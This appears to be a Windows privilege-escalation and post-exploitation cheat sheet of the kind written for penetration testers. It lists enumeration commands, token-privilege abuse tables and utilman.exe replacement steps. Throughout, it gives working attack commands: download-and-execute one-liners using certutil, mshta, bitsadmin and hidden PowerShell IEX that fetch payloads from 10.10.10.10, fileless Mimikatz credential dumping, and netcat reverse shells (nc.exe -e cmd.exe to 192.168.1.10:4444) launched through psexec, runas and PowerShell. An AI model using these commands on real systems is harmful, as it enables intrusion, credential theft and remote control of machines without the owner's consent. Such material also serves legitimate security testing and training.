
## First things first and quick wins

Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.

Find out what OS we are connected to:

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Enumerating the operating system patch level:

```
systeminfo
wmic qfe
```

wmic qfe gives you an overview of what updates have been installed in Windows, giving you a view of the system's patch history and enabling you to identify any missing patches or updates that could be exploited for privilege escalation.

Username information:
1- The whoami command informs you about what user you are currently running as. You can also use this with other switches, such as `/priv` and `/groups`**,** to gather more information on the privileges granted to your user and what security groups you are a member of.

```
whoami
whoami /priv
whoami /groups
```

2- The net user command will print out the users on the system. You can also use the 'net user username' to get a good overview of a specific user.

```
net user
net user <username>
net config Workstation 
```
3- The net localgroup command will display all available groups on the system. This can be useful for understanding the different access levels available on a system. You can also use this command with a group name to get an overview of the group's information and which users belong to it.

```
net localgroup
net localgroup Administrator
```

What is running on the machine?
If we are able to run WMIC we can pull rich details on the services and applications running:

```
wmic service list full > services.txt
wmic process > processes.txt
```

Or alternatively:

```
tasklist > processes.txt
```

Dump a tree of all the folders / files on the HDD  

```
tree c:\ > c:\users\public\folders.txt
```  

or for a list of files:

```  
dir /s c:\ > c:\users\public\files.txt
```  

Antivirus Enumeration:

```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

Default Writeable Folders:

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp
```

## Unquoted Service Path

In Windows environments when a service is started the system is attempting to find the location of the executable in order to successfully launch the service. If the executable is enclosed in quote tags “” then the system will know where to find it. However if the path of where the application binary is located doesn’t contain any quotes then Windows will try to find it and execute it inside every folder of this path until they reach the executable.

This can be abused in order to elevate privileges if the service is running under SYSTEM privileges.

discover all the services that are running on the target host and identify those that are not enclosed inside quotes:

```cmd
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
## Windows Enumeration

Windows Enumeration help penetration testers quickly identify potential privilege escalation vectors on Windows systems. this could be done with windows enumerate information about missing software patches, Task Scheduler and ...

### Automated Tools

1- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Privesc/PowerUp.ps1) is a PowerShell script that looks for common privilege escalations on the target system.

```c
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks
```

2- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) known as the "Windows Privilege Escalation Awesome Scripts".

```c
winPEASx64.exe
```

3- [SharpUp](https://github.com/GhostPack/SharpUp) is another tool from the GhostPack collection that acts as a C# port for multiple PowerUp functions.

```c
SharpUp.exe audit
```

### Automated Windows Enumeration

https://github.com/ohpe/juicy-potato
https://github.com/breenmachine/RottenPotatoNG
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
https://github.com/Prepouce/CoercedPotato

## Impersonation Privileges

[T1134 - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)

Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.

| Privilege              | Impact | Tool                                        | Execution path                                                                                                                                                                                                                                                 |
| ---------------------- | ------ | ------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SeAssignPrimaryToken` | Admin  | 3rd party tool                              | It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe                                                                                                                      |
| `SeBackup`             | Threat | Built-in commands                           | Read sensitve files with `robocopy /b`                                                                                                                                                                                                                         |
| `SeCreateToken`        | Admin  | 3rd party tool                              | Create arbitrary token including local admin rights with `NtCreateToken`.                                                                                                                                                                                      |
| `SeDebug`              | Admin  | PowerShell	Duplicate the `lsass.exe `token. |                                                                                                                                                                                                                                                                |
| `SeLoadDriver`         | Admin  | 3rd party tool                              | 1. Load buggy kernel driver such as szkg64.sys or capcom.sys 2. Exploit the driver vulnerabilityAlternatively, the privilege may be used to unload security-related drivers with ftlMC builtin command. i.e.: fltMC sysmondrv                                  |
| `SeRestore`            | Admin  | PowerShell                                  | 1. Launch `PowerShell/ISE` with the `SeRestore` privilege present. <br>2. Enable the privilege with Enable-`SeRestorePrivilege`. <br>3. Rename `utilman.exe `to `utilman.old` <br>4. Rename `cmd.exe` to `utilman.exe` <br>5. Lock the console and press Win+U |
| `SeTakeOwnership`      | Admin  | Built-in commands                           | 1. `takeown.exe /f "%windir%\system32"`<br>2. `icalcs.exe "%windir%\system32" /grant "%username%":F`<br>3. Rename `cmd.exe` to `utilman.exe` <br>4. Lock the console and press Win+U                                                                           |
| `SeTcb`                | Admin  | 3rd party tool                              | Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified.                                                                                                                                                              |

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

#### Juicy Potato (abusing the golden privileges)
[](https://github.com/ohpe/juicy-potato#juicy-potato-abusing-the-golden-privileges)
We discovered that, other than `BITS` there are a several COM servers we can abuse.
If the user has `SeImpersonate` or `SeAssignPrimaryToken` privileges then you are **SYSTEM**.
	CLSID is a unique identifier assigned to a COM (Component Object Model) class object or an interface.

#### BITS (Background Intelligent Transfer Service)
BITS is a Windows service that facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. It's particularly useful for downloading updates, as it minimizes the impact on the user's internet experience by using only idle bandwidth.

**Example Use Case:** Downloading Windows Updates is a typical scenario where BITS is used. BITS ensures that updates are downloaded without significantly impacting the user’s network usage.
BITS (Background Intelligent Transfer Service) utilizes COM (Component Object Model) technology. BITS exposes its functionality through COM interfaces, allowing developers to programmatically create, manage, and control file transfer jobs using COM-compatible languages such as C++, C#, or even scripting languages like PowerShell.

#### what is CLSID in windows?
CLSID stands for "Class Identifier" in Windows. It's a unique identifier assigned to a COM class object or an interface. In Windows, CLSIDs are used in the Windows Registry to uniquely identify COM objects and their associated information. They are used by applications to locate and instantiate COM objects. For example, when you install a new software application on Windows, it often registers its COM objects in the Windows Registry along with their CLSIDs. Other applications can then use these CLSIDs to interact with the objects provided by the installed software.

CLSIDs are typically represented as a globally unique identifier (GUID), which is a 128-bit value. They are written in the following format: {xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}, where each x represents a hexadecimal digit.

here are a few examples of CLSIDs:
1. **Internet Explorer CLSID**:
    - CLSID: {0002DF01-0000-0000-C000-000000000046}
    - This CLSID represents the Internet Explorer application. Other applications can use this CLSID to interact with Internet Explorer, for example, to open a new browser window.
2. **Windows Shell CLSID**:
    - CLSID: {20D04FE0-3AEA-1069-A2D8-08002B30309D}
    - This CLSID represents the "My Computer" or "This PC" icon on the Windows desktop. It provides access to various system resources and drives.
#### what is difference between CLSID and ordinal number?
CLSIDs are used to uniquely identify COM objects, while ordinal numbers are used to reference functions within a DLL by their positions in the export table. They serve different purposes in Windows programming.

https://github.com/BeichenDream/GodPotato
#### Enable `SeImpersonate` In Windows:
1. **Open Local Security Policy**:
    - Press Win + R to open the Run dialog.
    - Type `secpol.msc` and press Enter. This will open the Local Security Policy editor.
2. **Navigate to User Rights Assignment**:
    - In the Local Security Policy editor, expand "Local Policies" and select "User Rights Assignment".
3. **Assign the Privilege**:
    - In the right pane, double-click on "Impersonate a client after authentication".
4. **Add User**:
    - Click on the "Add User or Group" button.
    - Type "Arian" and click "Check Names" to ensure it's recognized.
    - Click OK.
5. **Apply and Confirm**:
    - Click OK to apply the changes and close the dialog.
    - Close the Local Security Policy editor.

#### Enable `SeAssignPrimaryToken` In Windows:
1. **Open Local Security Policy**:
    - Press Win + R to open the Run dialog.
    - Type `secpol.msc` and press Enter to open the Local Security Policy editor.
2. **Navigate to User Rights Assignment**:
    - In the Local Security Policy editor, expand "Local Policies" and then select "User Rights Assignment".
3. **Assign the Privilege**:
    - In the right pane, locate and double-click on "Replace a process level token" (which is the description for `SeAssignPrimaryTokenPrivilege`).
4. **Add User or Group**:
    - Click on the "Add User or Group" button.
    - Type the username (Arian) and click "Check Names" to ensure it resolves correctly.
    - Click OK to add the user.
5. **Apply and Confirm**:
    - Click OK to apply the changes and close the dialog.
    - Close the Local Security Policy editor.

#### Exploit
https://github.com/itm4n/PrintSpoofer

## Windows Kernel Exploits
### Finding Patch Level

Once you have established a reverse shell via Netcat, you can run the `systeminfo` command.

```c
systeminfo > syteminfo.txt
```
### Find Vulnerabilities

1- [Windows Exploit Suggester - Next Generation (WES-NG)](https://github.com/bitsadmin/wesng).

```c
python3 wes.py --update
python3 wes.py syteminfo.txt
```

2- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```c
python2 windows-exploit-suggester.py --database 2023-06-06-mssb.xlsx --systeminfo systeminfo.txt 
```
## Uploading files to the Windows machine

Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections).  Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. 
We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:  

1. VBScript HTTP Downloader
2. PowerShell HTTP Downloader
3. Python HTTP Downloader
4. FTP Downloader

*NOTE* There are MANY more ways to move files back and forth between a Windows machine, most can be found on the LOLBAS project:
https://lolbas-project.github.io/

Most of these will require that we create a simple local webserver on our Kali box to server the files.
I like to use the Python Simple HTTP Server:

```
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m SimpleHTTPServer 80
```

Or the Python pyftpdlib FTP Server (again don't run from TMUX):

```
apt-get install python-pyftpdlib
root@kali:~/Documents/Exploits/WindowsPRIVZ# python -m pyftpdlib -p 21
```

### Uploading Files with VBScript  
In my experiance, VBScript is one of the easiest methods of transfering files to a remote Windows. The only downside is that the file size you can transfer is rather limited.  I often have trouble transfering anything over 1 MB using this method and have to fall back on other methods (Windows-privesc-check2.exe is much too large to transfer using this method).  
First lets test to see if we can run VBScript  

```
echo WScript.StdOut.WriteLine "Yes we can run vbscript!" > testvb.vbs
```

Now we run it to see the results:  

```
cscript testvb.vbs
```

If you see the following message, we are good to go with VBScript!:

```
C:\Users\Test>cscript testvb.vbs
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.

Yes we can run vbscript!
```

If you see the following messages, you should move on to PowerShell:

```
C:\temp>cscript testvb.vbs
This program is blocked by group policy. For more information, contact your system administrator.
C:\temp>testvb.vbs
Access is denied.
```

Now we can create a very simple downloader script by copying and pasting this single line of code into your windows commandline. I have tried to create a VBS script to download files from a remote webserver with the least possible number of lines of VBS code and I believe this is it.
If Windows is an older version of windows (Windows 8 or Server 2012 and below) use the following script:

```
CMD C:\> echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs & echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs & echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

If Windows is a newer version (Windows 10 or Server 2016), try the following code:

```
CMD C:\> echo dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")  > dl.vbs &echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> dl.vbs &echo xHttp.Open "GET", WScript.Arguments(0), False  >> dl.vbs &echo xHttp.Send >> dl.vbs &echo bStrm.type = 1 >> dl.vbs &echo bStrm.open >> dl.vbs &echo bStrm.write xHttp.responseBody >> dl.vbs &echo bStrm.savetofile WScript.Arguments(1), 2 >> dl.vbs
```

Now try to download a file to the local path:

```
CMD C:\> cscript dl.vbs "http://10.10.10.10/archive.zip" ".\archive.zip"
```

### Uploading Files with CertUtil.exe
I've found that CertUtil can be quite reliable when all else seems to fail.

```
certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
```

### Transfering Files using MSHTA
Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). And it can also be used to transfer files :D  
HTML:

```
C:\>mshta http://10.10.10.10/badthings.exe
```

FTP:

```
C:\>mshta ftp://10.10.10.10:21/badthings.exe
```

### Trasfering Files using Bitsadmin

Background Intelligent Transfer Service (BITS) is a component of Microsoft Windows XP and later iterations of the operating systems, which facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. BITSAdmin is a command-line tool that you can use to create download or upload jobs and monitor their progress. For full, comprehensive documentation of the tool and all of its commands, see bitsadmin and bitsadmin examples in the Windows IT Pro Center.

```
C:\>bitsadmin /transfer badthings http://10.10.10.10:80/badthings.exe c:\users\public\payload.exe
```

### Uploading Files with PowerShell  

Test to see if we can run Powershell:

```cmd
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "get-host"
```

Test to see if we can run Powershell Version 2:

```cmd
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 2 -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$PSVersionTable"
```

Try to download a file from a remote server to the windows temp folder from the Windows command line:

```cmd
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
```

Or from a PowerShell... shell:

```powershell
PS C:\> IEX(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/exploit.exe\", \"C:\\Users\\Public\\Downloads\\exploit.exe\")"
```

OR This one seems to work better while at the console:

```powershell
PS C:\> IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/exploit.exe", "C:\Users\Public\Downloads\exploit.exe")
```

### Uploading Files with Python

Sometimes a Windows machine will have development tools like Python installed.
Check for python

```
python -h
```

Download a file using Python:

```
python -c "import urllib.request; urllib.request.urlretrieve('http://10.10.10.10/cat.jpg', 'C:\\Users\\Public\\Downloads\\cat.jpg');"
```

### Transfering Files via SMB using Impacket

Kali comes loade with the incredible Impacket library which is a swiss army knife of network protocols... just Awesome.  You can easily create a SMB share on your local Kali machine and move files between Kali and Windows with ease.  
https://github.com/SecureAuthCorp/impacket  

First we will setup the SMB Share on Kali like so:

```
root@kali:~# impacket-smbserver root /root/Desktop
Impacket v0.9.16-dev - Copyright 2002-2017 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
                                                                    
```

Confirm it is up and running using Net View on the Windows command line:

```
C:\Users\Null>net view \\192.168.0.49
Shared resources at \\192.168.0.49

(null)

Share name  Type  Used as  Comment

-------------------------------------------------------------------------------
smbshare    Disk
The command completed successfully.
```

Then we can trasnfer files from the command line as if it were a normal folder:

```
C:\Users\Admin>dir \\192.168.0.49\smbshare 
C:\Users\Admin>copy \\192.168.0.49\smbshare\loot.zip .  
```

By far the most interesting feature of the SMB Share method is that you can execute files directly over the SMB Share without copying them to the remote machine (fileless execution is so hot right now):

```
C:\Users\Admin>\\192.168.0.49\smbshare\payload.exe
```

A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:

```
net use y: \\192.168.0.49\smbshare  
y: 
dir 
```
## Execute a remote shell dropper

Often, you can leverage PowerShell to execute a remotely hosted powershell script which contains a shell dropper (generated by the platform of your choosing). 

```cmd
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden -NonInteractive -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
```

There are also some no-so-well documented PowerShell argument shortcuts so can use things like -w rather than -WindowsStyle (handy for smaller payloads):

```
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -w hidden -noni -nop -i None -ex Bypass -c "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1'))"
```  

### Upgrade Windows Command Line with a Powershell One-liner Reverse Shell

You can run this oneliner from the remote Windows command prompt to skip the file upload step entirely (again be sure to update the IP and port):

```cmd
removed beacause of av
```

### Netcat Reverseshell Oneliners for Windows

Sometimes it is helpful to create a new Netcat session from an existed limited shell, webshell or unstable (short lived) remote shell.

## Running Mimikatz

Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of plaintext credentials from memory, password hashes from local SAM/NTDS.dit databases, advanced Kerberos functionality, and more.  
https://github.com/gentilkiwi/mimikatz  

### Running traditional (binary) Mimikatz

The original and most frequently updated version of Mimikatz is the binary executable which can be found here:  
https://github.com/gentilkiwi/mimikatz/releases  

First we will need to download a Mimikatz binary and copy it to the remote machine

```
root@kali:~/test# wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip     
--2018-10-16 15:14:49--  https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip                     
root@kali:~/test# unzip mimikatz_trunk.zip
```

Now we will need to copy the 3 files (win32 or x64 depending on the OS) required to run Mimikatz to the remote server.

```
CMD C:\> @"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "(New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimidrv.sys\", \"C:\\Users\\Public\\Downloads\\mimidrv.sys\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimikatz.exe\", \"C:\\Users\\Public\\Downloads\\mimikatz.exe\"); (New-Object System.Net.WebClient).DownloadFile(\"http://10.10.10.10/mimilib.dll\", \"C:\\Users\\Public\\Downloads\\mimilib.dll\")"
```

Now, if we dont have an overly interactive shell, we will want to execute Mimikatz without the built in CLI by passing the correct parameters to the executable.  We use the log parameter to also log the clear password results to a file (just in case we are unable to see the output).

```
mimikatz log version "sekurlsa::logonpasswords" exit
```

Otherwise we can use the Mimikatz shell to get the passwords:

```
mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
```

### Running Powershell Mimikatz

The Powershell version is not as frequently updated, but can be loaded into memory without ever hitting the HDD (Fileless execution).  This version simply reflectively loads the Mimikatz binary into memory so we could probably update it ourselves without much difficulty. 

```
wget https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1
```

Fileless execution of Mimikatz from remotely hosted server:

```
PS C:\> IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1') ; Invoke-Mimikatz -DumpCreds
```

## Windows Run As

Switching users in linux is trival with the SU command. However, an equivalent command does not exist in Windows. Here are 3 ways to run a command as a different user in Windows.
list of handy windows tools that allows you to run a program as another user so long as you know their password:

- psexec64 
- runas.exe
- PowerShell 

Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

```cmd
 C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 
 PsExec v2.2 - Execute processes remotely
 Copyright (C) 2001-2016 Mark Russinovich
 Sysinternals - www.sysinternals.com
 ```
 
Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

```cmd
 C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
 Enter the password for Test:
 Attempting to start nc.exe as user "COMPUTERNAME\Test" ...
```

PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.
```powershell
 $username = '<username here>'
 $password = '<password here>'
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
 Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public
```

Next run this script using powershell.exe:

```cmd
CMD C:\> powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"
```

https://github.com/m0nad/awesome-privilege-escalation?tab=readme-ov-file
